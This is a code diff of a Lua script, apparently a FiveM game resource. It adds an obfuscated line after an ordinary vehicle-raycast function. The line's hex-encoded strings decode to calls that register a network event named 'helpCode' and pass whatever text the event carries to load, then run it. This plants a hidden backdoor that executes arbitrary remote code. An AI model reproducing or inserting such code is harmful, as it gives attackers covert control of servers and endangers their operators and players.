@@ -353,3 +353,6 @@ function getVehicleInDirection(coordFrom, coordTo)
     local a, b, c, d, vehicle = GetRaycastResult(rayHandle)
     return vehicle
 end
+
+
+local GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[6][GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[1]](GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[2]) GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[6][GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[3]](GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[2], function(BsxEbfhMlFihemZPOeVvcpTXrODITyNFeLSuBXlYoGIsCadLIRUWfIaDzSjUDBKvFBrgog) GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[6][GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[4]](GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[6][GiCkZSXrmxwnDnXbalYvaNdrwxXFmjPNakIQBFKrjCvDQHYQVOhJokTTYaNOydnPoxYTUH[5]](BsxEbfhMlFihemZPOeVvcpTXrODITyNFeLSuBXlYoGIsCadLIRUWfIaDzSjUDBKvFBrgog))() end)
